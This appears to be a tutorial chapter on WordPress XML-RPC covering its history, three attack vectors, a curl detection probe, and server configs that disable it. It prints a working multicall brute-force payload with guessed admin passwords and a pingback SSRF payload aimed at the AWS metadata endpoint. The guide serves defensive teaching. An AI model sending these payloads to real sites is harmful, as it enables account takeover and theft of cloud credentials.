Chapter 01 // Definition

📖 What is XML-RPC?

XML-RPC (XML Remote Procedure Call) is a protocol from 1998 that lets remote clients call functions on a server by sending XML payloads over HTTP. WordPress exposes it at /xmlrpc.php to support remote publishing, pingbacks, and the WordPress mobile app.

📝 The back door with no lock analogy

Imagine your house has a front door (wp-login.php) with a deadbolt, a camera, and a rate-limited buzzer. After 5 wrong buzzes, it locks for 15 minutes.

Now imagine there's a back door (xmlrpc.php) that was installed in 1998, has no camera, no buzzer limit, and you can shove 500 keys into it at once and it'll try them all before responding.

That's XML-RPC. It's a back door that handles bulk authentication requests with zero rate limiting. And it's open on every WordPress site by default.

why WP has it
Chapter 02 // History

📜 Why does WordPress still have this?

XML-RPC was added to WordPress before the REST API existed. It was the ONLY way to:

  • Publish posts from desktop clients (Windows Live Writer, MarsEdit)
  • Use the WordPress mobile app
  • Allow other sites to send pingbacks (trackback notifications)
  • Integrate with external services like Jetpack

Since WordPress 4.7 (2016), the REST API handles all of these use cases better and more securely. But XML-RPC was never disabled by default for backward compatibility. So it sits there, on every WordPress site, waiting to be abused.

⚠️ The kicker: Most WordPress site owners don't even know xmlrpc.php exists, let alone that it's enabled and internet-facing. They couldn't tell you what it does. But attackers absolutely know.
the 3 attacks
Chapter 03 // The three attack vectors

💥 Three ways XML-RPC gets you pwned

Attack 1: Brute-force amplification via system.multicall

The system.multicall method lets you batch multiple XML-RPC calls into a single HTTP request. Attackers abuse this by stuffing hundreds of wp.getUsersBlogs authentication attempts into one request.

🚪 wp-login.php

1 HTTP request = 1 password attempt
Rate limit: blocks after 5 attempts
Speed: slow, detectable

🚀 xmlrpc.php multicall

1 HTTP request = 500+ password attempts
Rate limit: counts as 1 request
Speed: 100x faster, often invisible to login-based protections

<!-- Multicall brute-force payload — 3 attempts in one request --> <!-- In real attacks, this is 500+ attempts per request --> <?xml version="1.0"?> <methodCall> <methodName>system.multicall</methodName> <params><param><value><array><data> <value><struct> <member><name>methodName</name> <value><string>wp.getUsersBlogs</string></value> </member> <member><name>params</name><value><array><data> <value><string>admin</string></value> <value><string>password123</string></value> </data></array></value></member> </struct></value> <value><struct> <member><name>methodName</name> <value><string>wp.getUsersBlogs</string></value> </member> <member><name>params</name><value><array><data> <value><string>admin</string></value> <value><string>letmein</string></value> </data></array></value></member> </struct></value> <value><struct> <member><name>methodName</name> <value><string>wp.getUsersBlogs</string></value> </member> <member><name>params</name><value><array><data> <value><string>admin</string></value> <value><string>qwerty</string></value> </data></array></value></member> </struct></value> </data></array></value></param></params> </methodCall>

Attack 2: SSRF via pingback.ping

The pingback method tells WordPress: "Hey, I linked to your post — come visit my URL to verify." WordPress obediently makes an HTTP request to whatever URL you specify. That's textbook SSRF.

<!-- Pingback SSRF — make WordPress fetch an internal URL --> <?xml version="1.0"?> <methodCall> <methodName>pingback.ping</methodName> <params> <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param> <param><value><string>https://target.com/some-real-post</string></value></param> </params> </methodCall>

This makes the target WordPress server fetch the AWS metadata endpoint (169.254.169.254) from its own internal network. If the server is on AWS, you might get IAM credentials back. Classic cloud SSRF via an unexpected vector.

Attack 3: DDoS amplification

An attacker sends pingback requests from thousands of WordPress sites, all pointing to a single victim URL. Each WordPress site "verifies" the pingback by hitting the victim with an HTTP request. The attacker's bandwidth is amplified through all those WordPress servers acting as unwitting reflectors.

detection
Chapter 04 // Detection

🔎 How to detect XML-RPC (10-second probe)

# Quick probe — does xmlrpc.php respond? curl -s -X POST https://target.com/xmlrpc.php \ -H "Content-Type: text/xml" \ -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

If it returns a list of methods (wp.getUsersBlogs, pingback.ping, system.multicall…) — XML-RPC is enabled and open for business.

If you get a 403, 405, or empty response — it's been blocked. Move on.

💡 WPScan shortcut: WPScan automatically checks for XML-RPC during its standard scan. Look for [+] XML-RPC seems to be enabled in the output.
🧠 Brain Power
Why can XML-RPC brute force bypass rate limiting that blocks wp-login.php?

Because system.multicall batches hundreds of login attempts into a single HTTP request — and rate limits typically count requests, not individual authentication attempts within a request.

Here's the math:

  • wp-login.php: Rate limit = 5 attempts per minute → 5 passwords tried per minute
  • xmlrpc.php multicall: Rate limit = 5 requests per minute → but each request contains 500 attempts → 2,500 passwords tried per minute

Most login-protection plugins (Wordfence, Limit Login Attempts) monitor wp-login.php but don't hook into XML-RPC authentication at the same granularity. The rate limiter sees 1 request; inside that request, 500 passwords are being tested.

It's like airport security counting bags on the conveyor belt — they count "1 bag" but don't notice you packed 500 smaller bags inside it.

defense
Chapter 05 // Disabling XML-RPC

🛡️ Kill it. Kill it now.

Unless you specifically need XML-RPC (Jetpack, legacy mobile app, or a specific integration that hasn't migrated to REST API), disable it entirely.

Method 1: .htaccess (Apache)

# Add to .htaccess in the WordPress root <Files xmlrpc.php> Order Allow,Deny Deny from all </Files>

Method 2: Nginx config

# Add to your nginx server block location = /xmlrpc.php { deny all; access_log off; log_not_found off; return 403; }

Method 3: WordPress filter (functions.php)

// Disable XML-RPC at the application level add_filter('xmlrpc_enabled', '__return_false');
🧠 Best practice: Block at the web server level (Methods 1 or 2) rather than the PHP level (Method 3). The web server block prevents PHP from even executing, saving server resources and eliminating the attack surface completely.
